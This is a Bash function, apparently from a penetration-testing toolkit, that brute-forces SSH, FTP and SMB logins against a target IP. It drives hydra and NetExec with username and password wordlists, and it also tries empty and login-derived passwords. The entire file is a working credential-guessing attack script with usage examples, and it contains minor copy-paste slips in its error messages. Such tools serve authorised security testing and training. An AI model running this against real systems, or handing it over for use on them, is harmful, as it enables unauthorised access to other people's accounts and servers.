# Description:
#   Bruteforce services with predefined arguments.
#   By default, it loads the username.txt and password.txt on the current directory.
# Usage: bruteforce [-h, --help] <-i, --ip IP> <-s, --service SERVICE> [OPTIONS]
# Arguments:
#   - IP: target IPv4 address
#   - SERVICE: current support with: ssh, ftp, smb
#   - OPTIONS:
#       + [-u, --username string|file]: used username (or wordlist)
#       + [-p, --password string|file]: used password (or wordlist)
#       + [-P, --port port]: used port
# Example: 
#   bruteforce -s ssh -i $target
#   bruteforce -s smb -i $target
#   bruteforce -s ftp -i $target -p password.txt
function bruteforce() {
    [[ $# -eq 0 || $1 == "-h" || $1 == "--help" ]] && _help && return 0

    local arg_ip
    local arg_service
    local arg_port
    local arg_username="$PWD/username.txt"
    local arg_password="$PWD/password.txt"

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -i|--ip) arg_ip="$2" && shift 2 ;;
            -s|--service) arg_service="$2" && shift 2 ;;
            -P|--port) arg_port="$2" && shift 2 ;;
            -u|--username) arg_username="$2" && shift 2 ;;
            -p|--password) arg_password="$2" && shift 2 ;;
            *) _help && return 0 ;;
        esac
    done

    [[ ! -f "$arg_username" && ! -n "$arg_username" ]] && _logger -l error "Type of username incorrect. Required: string, files" && return 1
    [[ ! -f "$arg_password" && ! -n "$arg_password" ]] && _logger -l error "Type of password incorrect. Required: string, files" && return 1

    case $arg_service in
        ftp|ssh)
            [[ "$arg_service" == "ftp" ]] && used_port="${arg_port:-21}"
            [[ "$arg_service" == "ssh" ]] && used_port="${arg_port:-22}"

            local username_fmt="-l"
            [[ -z "$arg_username" ]] && _logger error "[e] username is not set." && return 1
            [[ -f "$arg_username" ]] && username_fmt="-L"
            
            local password_fmt="-p"
            [[ -z "$arg_password" ]] && _logger error "[e] username is not set." && return 1
            [[ -f "$arg_password" ]] && password_fmt="-P"

            _wrap hydra $username_fmt $arg_username -e nsr -s $used_port $arg_service://$arg_ip
            _wrap hydra $username_fmt $arg_username $password_fmt $arg_password -s $used_port $arg_service://$arg_ip
            ;;
        smb)
            _wrap nxc smb $arg_ip -u $arg_username -p $arg_password --local-auth
            _wrap nxc smb $arg_ip -u $arg_username -p $arg_password
            ;;
    esac
}